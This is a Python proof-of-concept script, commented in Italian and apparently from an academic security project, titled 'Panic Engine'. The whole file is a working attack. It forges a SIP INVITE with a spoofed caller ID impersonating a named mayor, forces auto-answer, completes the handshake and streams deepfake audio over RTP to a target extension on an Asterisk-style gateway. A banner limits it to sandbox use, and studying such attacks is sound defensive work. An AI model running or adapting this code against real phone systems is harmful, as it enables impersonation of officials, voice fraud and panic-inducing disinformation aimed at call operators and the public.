#!/usr/bin/env python3
"""
============================================================
 PANIC ENGINE — SIP Spoofing & RTP Deepfake Injection
 Progetto CSS — Caso di studio "Festival AI-driven (Barletta)"
============================================================

 Questo script esegue un attacco in 3 fasi:
   1. SIP INVITE Spoofing (Caller-ID Falsificato)
   2. SIP Handshake (attesa 200 OK)
   3. RTP Media Injection (streaming deepfake audio)

 Kill Chain Mapping:
   - Fase 1: Initial Foothold / Delivery (Dominio Cyber)
   - Fase 2: C2 Establishment (Dominio Cyber)
   - Fase 3: Objective / Impact  (Dominio Cognitivo)

 CWE sfruttate:
   - CWE-862: Missing Authorization (INVITE anonimo accettato)
   - CWE-287: Improper Authentication (no digest auth)
"""

import socket
import struct
import time
import wave
import audioop
import random
import string
import sys
import os

# ─── CONFIGURAZIONE ──────────────────────────────────────────

GATEWAY_IP   = "10.5.0.50"
GATEWAY_PORT = 5060
TARGET_EXT   = "200"

ATTACKER_IP  = "10.5.0.99"
ATTACKER_SIP_PORT = 5080       # Porta SIP locale dell'attaccante
ATTACKER_RTP_PORT = 40000      # Porta RTP locale per ricevere/inviare media

# Identità falsificata (Caller-ID Spoofing)
# Simula il Sindaco per innescare bias di autorità (Tunneling Cognitivo)
SPOOFED_DISPLAY = "Burgemeester Jeroen Baert"
SPOOFED_URI     = "sip:mayor@comune.boom.be"

# Percorso del file audio deepfake
PAYLOAD_WAV = "/app/payload/deepfake_voice.wav"

# Parametri RTP
RTP_PAYLOAD_TYPE = 0        # PCMU (G.711 µ-law)
RTP_CLOCK_RATE   = 8000     # 8000 Hz
RTP_PTIME        = 20       # 20 ms per pacchetto
RTP_SAMPLES      = 160      # 160 campioni per pacchetto (8000 * 0.020)


# ─── UTILITÀ ─────────────────────────────────────────────────

def random_tag(length=8):
    """Genera un tag SIP casuale."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def random_callid():
    """Genera un Call-ID univoco."""
    return f"{random.randint(100000, 999999)}@{ATTACKER_IP}"


def random_branch():
    """Genera un branch ID conforme a RFC 3261 (prefisso z9hG4bK)."""
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    return f"z9hG4bK{suffix}"


def build_rtp_header(seq, timestamp, ssrc, marker=False):
    """
    Costruisce un header RTP di 12 byte (RFC 3550).

    Layout:
        Byte 0: V=2 | P=0 | X=0 | CC=0  → 0x80
        Byte 1: M | PT(7 bit)
        Byte 2-3: Sequence Number (16 bit, big-endian)
        Byte 4-7: Timestamp (32 bit, big-endian)
        Byte 8-11: SSRC (32 bit, big-endian)
    """
    byte0 = 0x80  # V=2, P=0, X=0, CC=0
    byte1 = (0x80 if marker else 0x00) | (RTP_PAYLOAD_TYPE & 0x7F)
    return struct.pack('!BBHII', byte0, byte1, seq & 0xFFFF, timestamp, ssrc)


def load_audio_payload(filepath):
    """
    Carica il file WAV e lo converte in campioni G.711 µ-law.
    Ritorna i byte audio raw in formato PCMU.
    """
    if not os.path.exists(filepath):
        print(f"[!] File non trovato: {filepath}")
        print("[*] Generazione tono di test (440 Hz, 5 secondi)...")
        return generate_test_tone()

    print(f"[*] Caricamento payload audio: {filepath}")

    with wave.open(filepath, 'rb') as wf:
        n_channels = wf.getnchannels()
        sampwidth  = wf.getsampwidth()
        framerate  = wf.getframerate()
        n_frames   = wf.getnframes()
        raw_data   = wf.readframes(n_frames)

        print(f"    Canali: {n_channels}, Bit: {sampwidth*8}, "
              f"Sample Rate: {framerate} Hz, Durata: {n_frames/framerate:.1f}s")

    # Conversione mono se necessario
    if n_channels == 2:
        raw_data = audioop.tomono(raw_data, sampwidth, 1, 1)

    # Conversione sample rate a 8000 Hz se necessario
    if framerate != RTP_CLOCK_RATE:
        raw_data, _ = audioop.ratecv(raw_data, sampwidth, 1,
                                      framerate, RTP_CLOCK_RATE, None)

    # Conversione a 16-bit PCM se necessario (audioop.lin2ulaw richiede 2 byte)
    if sampwidth == 1:
        raw_data = audioop.lin2lin(raw_data, 1, 2)
    elif sampwidth == 4:
        raw_data = audioop.lin2lin(raw_data, 4, 2)

    # Conversione PCM lineare → µ-law
    ulaw_data = audioop.lin2ulaw(raw_data, 2)

    print(f"    Payload PCMU: {len(ulaw_data)} byte "
          f"({len(ulaw_data)/RTP_CLOCK_RATE:.1f}s)")

    return ulaw_data


def generate_test_tone(freq=440, duration=5):
    """
    Genera un tono sinusoidale di test a 440 Hz.
    Ritorna byte in formato G.711 µ-law.
    """
    import math

    samples = []
    for i in range(RTP_CLOCK_RATE * duration):
        # Genera campione sinusoidale a 16 bit
        sample = int(16384 * math.sin(2 * math.pi * freq * i / RTP_CLOCK_RATE))
        samples.append(struct.pack('<h', sample))

    pcm_data = b''.join(samples)
    ulaw_data = audioop.lin2ulaw(pcm_data, 2)

    print(f"    Tono generato: {freq} Hz, {duration}s, "
          f"{len(ulaw_data)} byte PCMU")

    return ulaw_data


# ─── FASE 1: SIP INVITE SPOOFING ────────────────────────────

def phase1_sip_invite(sock):
    """
    Forgia e invia un pacchetto SIP INVITE con Caller-ID falsificato.

    L'INVITE è costruito manualmente (non tramite stack SIP) per
    avere pieno controllo sugli header, bypassando qualsiasi
    validazione client-side.
    """
    print("\n" + "="*60)
    print("  FASE 1: SIP INVITE SPOOFING")
    print("="*60)

    tag    = random_tag()
    callid = random_callid()
    branch = random_branch()

    # ── Corpo SDP ────────────────────────────────────────────
    sdp_body = (
        "v=0\r\n"
        f"o=spoofed 123456 123456 IN IP4 {ATTACKER_IP}\r\n"
        "s=Panic Engine PoC\r\n"
        f"c=IN IP4 {ATTACKER_IP}\r\n"
        "t=0 0\r\n"
        f"m=audio {ATTACKER_RTP_PORT} RTP/AVP {RTP_PAYLOAD_TYPE}\r\n"
        f"a=rtpmap:{RTP_PAYLOAD_TYPE} PCMU/{RTP_CLOCK_RATE}\r\n"
        f"a=ptime:{RTP_PTIME}\r\n"
    )

    # ── Header SIP INVITE ────────────────────────────────────
    sip_invite = (
        f"INVITE sip:{TARGET_EXT}@{GATEWAY_IP}:{GATEWAY_PORT} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {ATTACKER_IP}:{ATTACKER_SIP_PORT};branch={branch};rport\r\n"
        "Max-Forwards: 70\r\n"
        f'From: "{SPOOFED_DISPLAY}" <{SPOOFED_URI}>;tag={tag}\r\n'
        f"To: <sip:{TARGET_EXT}@{GATEWAY_IP}>\r\n"
        f"Call-ID: {callid}\r\n"
        "CSeq: 1 INVITE\r\n"
        f"Contact: <sip:spoofed@{ATTACKER_IP}:{ATTACKER_SIP_PORT}>\r\n"
        "Content-Type: application/sdp\r\n"
        # Header per forzare auto-answer su terminali compatibili
        "Call-Info: <sip:>;answer-after=0\r\n"
        f"Content-Length: {len(sdp_body)}\r\n"
        "\r\n"
        f"{sdp_body}"
    )

    print(f"\n[*] Target: sip:{TARGET_EXT}@{GATEWAY_IP}:{GATEWAY_PORT}")
    print(f'[*] Caller-ID Spoofato: "{SPOOFED_DISPLAY}" <{SPOOFED_URI}>')
    print(f"[*] RTP endpoint: {ATTACKER_IP}:{ATTACKER_RTP_PORT}")

    # Invio INVITE
    sock.sendto(sip_invite.encode(), (GATEWAY_IP, GATEWAY_PORT))
    print(f"\n[+] INVITE inviato ({len(sip_invite)} byte)")

    # Debug: mostra il messaggio SIP completo
    print("\n--- SIP INVITE (raw) ---")
    for line in sip_invite.split('\r\n')[:12]:
        print(f"  {line}")
    print("  [... SDP body ...]")
    print("--- fine ---\n")

    return callid, tag, branch


# ─── FASE 2: SIP HANDSHAKE ──────────────────────────────────

def phase2_wait_response(sock, callid):
    """
    Attende la risposta dal gateway SIP.
    Cerca un '200 OK' che indica che la chiamata è stata accettata
    (grazie all'auto-answer di Baresip).

    Gestisce anche risposte intermedie (100 Trying, 180 Ringing).
    """
    print("="*60)
    print("  FASE 2: SIP HANDSHAKE")
    print("="*60)
    print("\n[*] In attesa di risposta dal gateway...")

    sock.settimeout(15)  # Timeout 15 secondi
    rtp_target_ip = None
    rtp_target_port = None
    got_200_ok = False

    try:
        while True:
            data, addr = sock.recvfrom(4096)
            response = data.decode('utf-8', errors='replace')
            first_line = response.split('\r\n')[0]

            print(f"\n[<] Ricevuto da {addr}: {first_line}")

            # ── 100 Trying ───────────────────────────────────
            if 'SIP/2.0 100' in first_line:
                print("    → Il gateway sta processando l'INVITE...")
                continue

            # ── 180 Ringing ──────────────────────────────────
            if 'SIP/2.0 180' in first_line:
                print("    → Il terminale operatore sta squillando...")
                continue

            # ── 200 OK ───────────────────────────────────────
            if 'SIP/2.0 200' in first_line:
                print("    → CHIAMATA ACCETTATA (auto-answer attivo)")
                got_200_ok = True

                # Parsing SDP per estrarre IP e porta RTP della vittima
                for line in response.split('\r\n'):
                    if line.startswith('c=IN IP4'):
                        rtp_target_ip = line.split()[-1]
                    if line.startswith('m=audio'):
                        parts = line.split()
                        rtp_target_port = int(parts[1])

                if rtp_target_ip and rtp_target_port:
                    print(f"\n[+] RTP target estratto: {rtp_target_ip}:{rtp_target_port}")
                else:
                    # Fallback: invia RTP direttamente al gateway
                    rtp_target_ip = GATEWAY_IP
                    rtp_target_port = 10000
                    print(f"\n[!] SDP parsing fallito — fallback: {rtp_target_ip}:{rtp_target_port}")

                # Invia ACK per completare il 3-way handshake SIP
                send_ack(sock, callid)
                break

            # ── Risposte di errore ───────────────────────────
            if response.startswith('SIP/2.0 4') or response.startswith('SIP/2.0 5'):
                print(f"    → ERRORE: {first_line}")
                print("[!] L'attacco è stato bloccato dal gateway.")
                sys.exit(1)

    except socket.timeout:
        print("\n[!] TIMEOUT: Nessuna risposta dal gateway entro 15 secondi.")
        print("    Possibili cause:")
        print("    - Asterisk non è avviato")
        print("    - L'endpoint [anonymous] non è configurato")
        print("    - Firewall/rete non raggiungibile")
        sys.exit(1)

    return rtp_target_ip, rtp_target_port, got_200_ok


def send_ack(sock, callid):
    """Invia ACK per completare il 3-way handshake SIP."""
    branch = random_branch()
    ack = (
        f"ACK sip:{TARGET_EXT}@{GATEWAY_IP}:{GATEWAY_PORT} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {ATTACKER_IP}:{ATTACKER_SIP_PORT};branch={branch}\r\n"
        "Max-Forwards: 70\r\n"
        f'From: "{SPOOFED_DISPLAY}" <{SPOOFED_URI}>;tag={random_tag()}\r\n'
        f"To: <sip:{TARGET_EXT}@{GATEWAY_IP}>\r\n"
        f"Call-ID: {callid}\r\n"
        "CSeq: 1 ACK\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
    )
    sock.sendto(ack.encode(), (GATEWAY_IP, GATEWAY_PORT))
    print("[+] ACK inviato — handshake completato")


# ─── FASE 3: RTP MEDIA INJECTION ────────────────────────────

def phase3_rtp_injection(rtp_target_ip, rtp_target_port, audio_data):
    """
    Streaming del payload audio deepfake via pacchetti RTP.

    Ogni pacchetto contiene 160 campioni (20ms) di audio G.711 µ-law.
    Il timing è controllato per simulare streaming real-time.
    """
    print("\n" + "="*60)
    print("  FASE 3: RTP MEDIA INJECTION")
    print("="*60)

    rtp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    rtp_sock.bind((ATTACKER_IP, ATTACKER_RTP_PORT))

    ssrc = random.randint(1, 0xFFFFFFFF)
    seq  = random.randint(0, 0xFFFF)
    ts   = random.randint(0, 0xFFFFFFFF)

    total_samples = len(audio_data)
    total_packets = total_samples // RTP_SAMPLES
    duration_s    = total_samples / RTP_CLOCK_RATE

    print(f"\n[*] Streaming verso: {rtp_target_ip}:{rtp_target_port}")
    print(f"[*] SSRC: {ssrc:#010x}")
    print(f"[*] Pacchetti da inviare: {total_packets}")
    print(f"[*] Durata stimata: {duration_s:.1f} secondi")
    print(f"[*] Payload Type: {RTP_PAYLOAD_TYPE} (PCMU)")
    print(f"[*] Ptime: {RTP_PTIME}ms ({RTP_SAMPLES} samples/packet)")
    print()

    offset = 0
    pkt_count = 0
    start_time = time.time()

    try:
        while offset + RTP_SAMPLES <= total_samples:
            # Estrai chunk di 160 campioni
            chunk = audio_data[offset:offset + RTP_SAMPLES]

            # Costruisci header RTP (marker=True sul primo pacchetto)
            marker = (pkt_count == 0)
            rtp_header = build_rtp_header(seq, ts, ssrc, marker)

            # Pacchetto completo: header (12 byte) + payload (160 byte)
            rtp_packet = rtp_header + chunk

            # Invio
            rtp_sock.sendto(rtp_packet, (rtp_target_ip, rtp_target_port))

            # Progresso
            pkt_count += 1
            if pkt_count % 50 == 0:  # Ogni secondo (50 * 20ms = 1s)
                elapsed = time.time() - start_time
                print(f"    [{pkt_count}/{total_packets}] "
                      f"{elapsed:.1f}s trascorsi — "
                      f"{pkt_count * RTP_SAMPLES / RTP_CLOCK_RATE:.1f}s audio inviati")

            # Aggiorna contatori
            seq = (seq + 1) & 0xFFFF
            ts  = (ts + RTP_SAMPLES) & 0xFFFFFFFF
            offset += RTP_SAMPLES

            # Timing: 20ms tra pacchetti per simulare real-time
            next_send = start_time + (pkt_count * RTP_PTIME / 1000.0)
            sleep_time = next_send - time.time()
            if sleep_time > 0:
                time.sleep(sleep_time)

    except KeyboardInterrupt:
        print("\n\n[!] Interruzione manuale — streaming interrotto")

    finally:
        rtp_sock.close()

    elapsed = time.time() - start_time
    print(f"\n[+] Streaming completato: {pkt_count} pacchetti in {elapsed:.1f}s")


# ─── MAIN ────────────────────────────────────────────────────

def main():
    print(r"""
    ╔═══════════════════════════════════════════════════════╗
    ║           PANIC ENGINE — SIP SPOOFING POC            ║
    ║     Cyber-Social Security · Festival Barletta        ║
    ╠═══════════════════════════════════════════════════════╣
    ║  [!] Solo per uso accademico in ambiente sandbox     ║
    ║  [!] CWE-862 + CWE-287 → Caller-ID Spoofing         ║
    ║  [!] Deepfake Audio Injection via RTP                ║
    ╚═══════════════════════════════════════════════════════╝
    """)

    # Carica payload audio
    audio_data = load_audio_payload(PAYLOAD_WAV)
    if not audio_data:
        print("[!] Impossibile caricare il payload audio. Uscita.")
        sys.exit(1)

    # Crea socket SIP
    sip_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sip_sock.bind((ATTACKER_IP, ATTACKER_SIP_PORT))
    print(f"[*] Socket SIP in ascolto su {ATTACKER_IP}:{ATTACKER_SIP_PORT}")

    try:
        # Fase 1: Forgia e invia INVITE con Caller-ID spoofato
        callid, tag, branch = phase1_sip_invite(sip_sock)

        # Fase 2: Attendi risposta e completa handshake
        rtp_target_ip, rtp_target_port, success = phase2_wait_response(sip_sock, callid)

        if not success:
            print("[!] Handshake SIP fallito. Uscita.")
            sys.exit(1)

        # Breve pausa per stabilizzare la sessione
        print("\n[*] Sessione stabilita. Inizio injection tra 1 secondo...")
        time.sleep(1)

        # Fase 3: Streaming del deepfake audio via RTP
        phase3_rtp_injection(rtp_target_ip, rtp_target_port, audio_data)

    except Exception as e:
        print(f"\n[!] Errore: {e}")
        import traceback
        traceback.print_exc()

    finally:
        sip_sock.close()
        print("\n[*] Socket chiuso. Attacco terminato.")

    # ── Riepilogo ────────────────────────────────────────────
    print("\n" + "="*60)
    print("  RIEPILOGO ATTACCO")
    print("="*60)
    print(f"  Target:      sip:{TARGET_EXT}@{GATEWAY_IP}")
    print(f'  Spoofed ID:  "{SPOOFED_DISPLAY}" <{SPOOFED_URI}>')
    print(f"  Payload:     {PAYLOAD_WAV}")
    print(f"  Kill Chain:  Delivery → C2 → Impact (Cognitive)")
    print(f"  CWE:         CWE-862, CWE-287")
    print("="*60)


if __name__ == "__main__":
    main()
